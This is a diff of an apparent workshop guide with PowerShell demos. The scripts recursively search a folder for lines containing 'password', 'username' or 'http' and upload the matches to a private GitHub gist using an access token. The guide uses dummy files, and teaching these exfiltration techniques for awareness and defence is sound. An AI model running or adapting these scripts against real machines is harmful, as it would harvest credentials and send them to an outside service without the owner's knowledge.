@@ -61,7 +61,7 @@ This should fix your issue.
 For demo purposes we're going to create 2 dummy files: `password.txt` and `secrets.txt` Create a temp folder on your harddisk (if none exist) and put these 2 files in it folder: `C:\temp`
 
 password.txt has the following contents
-```powershell
+```
 
 PUT THIS FILE IN C:\temp
 I do silly things like sometimes putting passwords in files.
@@ -82,7 +82,7 @@ Create a new file called "new-github2.ps1" and copy paste the following data in 
 
 #Demo 2, let's grab some "passwords" from local files!
 . .\logindata.ps1
-$Content = ls c:\temp -r | Select-String dog,cat,pets | select line,path
+$Content = ls c:\temp -r | Select-String http,password,username | select line,path
 $ContentString = $Content | ForEach-Object { "$($_.path): $($_.line)" } | Out-String
 
 $Description = "Github second demo"
@@ -129,12 +129,13 @@ Remark: This is actually some foreshadowing. This workshop is all about using a 
 new-github4.ps1
 ```powershell
 . .\logindata.ps1
-$c = Get-ChildItem C:\temp\test -Recurse | Select-String 'password|username|http' | ForEach-Object { "$($_.Path): $($_.Line)" } | Out-String
+$c = Get-ChildItem C:\temp\ -Recurse | Select-String 'password|username|http' | ForEach-Object { "$($_.Path): $($_.Line)" } | Out-String
 $body = @{description="Github fourth demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json
 Invoke-WebRequest -Uri "https://api.github.com/gists" -Method POST -Headers @{Authorization="Bearer $FGPAT"
 "X-GitHub-Api-Version"="2022-11-28"} -Body $body -ContentType "application/json"
 
 ```
+:warning: Have you seen the different syntax to perform a 'dir' command between exercise #2 and #4 ?
 
 # Github fifth demo
 
@@ -143,7 +144,7 @@ But what if, we try to optimize our character length a BIT more (by making it a 
 new-github5.ps1
 ```powershell
 $FGPAT     =   "github_pat_STRINGHERE"
-$c = gci C:\temp\test -R | sls 'password|username|http' | % { "$($_.Path): $($_.Line)" } | Out-String
+$c = gci C:\temp\ -R | sls 'password|username|http' | % { "$($_.Path): $($_.Line)" } | Out-String
 $body = @{description="Github 5th demo"; public=$false; files=@{"secrets.txt"=@{content=$c}}} | ConvertTo-Json
 iwr -Uri "https://api.github.com/gists" -Me POST -H @{Authorization="Bearer $FGPAT"} -B $body -Co "application/json"
 ```
